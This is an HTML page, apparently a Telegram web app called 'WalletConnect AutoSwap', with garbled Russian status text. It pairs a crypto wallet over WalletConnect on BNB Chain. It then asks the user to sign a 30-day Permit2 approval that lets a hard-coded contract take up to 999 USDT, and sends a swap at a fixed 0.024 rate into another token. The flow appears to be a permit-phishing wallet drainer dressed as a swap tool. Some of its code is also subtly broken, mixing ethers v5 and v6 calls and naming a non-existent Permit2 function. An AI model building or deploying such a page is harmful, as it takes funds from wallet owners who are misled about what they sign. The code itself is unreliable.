<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WalletConnect AutoSwap</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg,#1a1f2d,#0d1520);
      color:#e0e0e0; text-align:center; margin:0; padding:20px;
    }
    .container{max-width:500px;margin:0 auto;position:relative;padding:30px;background:rgba(30,40,55,0.8);border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.4);}
    canvas{margin:20px auto;}
    #status{margin-top:20px;font-size:16px;min-height:40px;}
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ WalletConnect AutoSwap</h1>
    <canvas id="qrcode"></canvas>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
  </div>

  <!-- –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫ -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–¥ –∫–∞–∫ ESM -->
  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';

    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainNamespace: "eip155",
      chainIdNum: 56,
      chainId: "eip155:56",
      rpcUrl: "https://bsc-dataseed.binance.org",
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      tokenIn: "0x55D398326f99059FF775485246999027B3197955",
      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f",
      limit: ethers.parseUnits("999", 18),
      deadlineSec: 30 * 24 * 3600,
      rateScaled: ethers.parseUnits("0.024", 18)
    };

    const statusEl = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");
    function setStatus(msg, color="#4fc3f7") { statusEl.textContent = msg; statusEl.style.color = color; }

    async function runApp() {
      try {
        setStatus("‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");
        const client = await SignClient.init({
          projectId: CONFIG.projectId,
          relayUrl: "wss://relay.walletconnect.com",
          metadata: { name:"AutoSwap", description:"Permit2 ‚Üí AutoSwap", url:location.href, icons:["https://walletconnect.com/favicon.ico"] }
        });

        setStatus("üîó –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏ –∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è QR...");
        const { uri, approval } = await client.connect({
          requiredNamespaces:{
            [CONFIG.chainNamespace]: {
              chains:[CONFIG.chainId],
              methods:["eth_sendTransaction","eth_signTypedData_v4"],
              events:["chainChanged","accountsChanged"]
            }
          }
        });

        if(uri){
          QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
          setStatus("üì± –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥");
        }

        const session = await approval();
        const address = session.namespaces[CONFIG.chainNamespace].accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${address}`, "#66bb6a");

        const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
        const permit2Abi = ["function allowanceNonces(address owner,address spender,address token) view returns (uint48)"];
        const permit2Contract = new ethers.Contract(CONFIG.permit2, permit2Abi, provider);
        const nonce = await permit2Contract.allowanceNonces(address, CONFIG.autoswap, CONFIG.tokenIn);

        const now = Math.floor(Date.now() / 1000), deadline = now + CONFIG.deadlineSec;
        const domain = { name:"Permit2", chainId:CONFIG.chainIdNum, verifyingContract:CONFIG.permit2 };
        const types = {
          PermitTransferFrom:[
            {name:"permitted",type:"TokenPermissions"},
            {name:"spender",type:"address"},
            {name:"nonce",type:"uint256"},
            {name:"deadline",type:"uint256"}
          ],
          TokenPermissions:[
            {name:"token",type:"address"},
            {name:"amount",type:"uint256"}
          ]
        };
        const message = { permitted:{token:CONFIG.tokenIn,amount:CONFIG.limit}, spender:CONFIG.autoswap, nonce, deadline };

        setStatus("‚úçÔ∏è –ó–∞–ø—Ä–æ—Å EIP‚Äë712 –ø–æ–¥–ø–∏—Å–∏ Permit2...");
        const signature = await client.request({
          topic:session.topic,
          chainId:CONFIG.chainId,
          request:{ method:"eth_signTypedData_v4", params:[address, JSON.stringify({types,domain,primaryType:"PermitTransferFrom",message})] }
        });

        setStatus("üîÑ –û—Ç–ø—Ä–∞–≤–∫–∞ swap —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...");
        const swapIface = new ethers.utils.Interface([
          "function swapForUser(address user,address tokenIn,uint256 amount,uint256 nonce,uint256 deadline,address tokenOut,uint256 rate,bytes signature)"
        ]);
        const data = swapIface.encodeFunctionData("swapForUser", [
          address, CONFIG.tokenIn, CONFIG.limit, nonce, deadline,
          CONFIG.tokenOut, CONFIG.rateScaled, signature
        ]);

        const txParams = { from: address, to: CONFIG.autoswap, data };
        const txHash = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request:{ method:"eth_sendTransaction", params:[txParams] }
        });

        setStatus(`‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:\n${txHash}`, "#66bb6a");
      } catch(e) {
        console.error(e);
        setStatus("‚ùå –û—à–∏–±–∫–∞: " + e.message, "#ff6b6b");
      }
    }

    runApp();
  </script>
</body>
</html>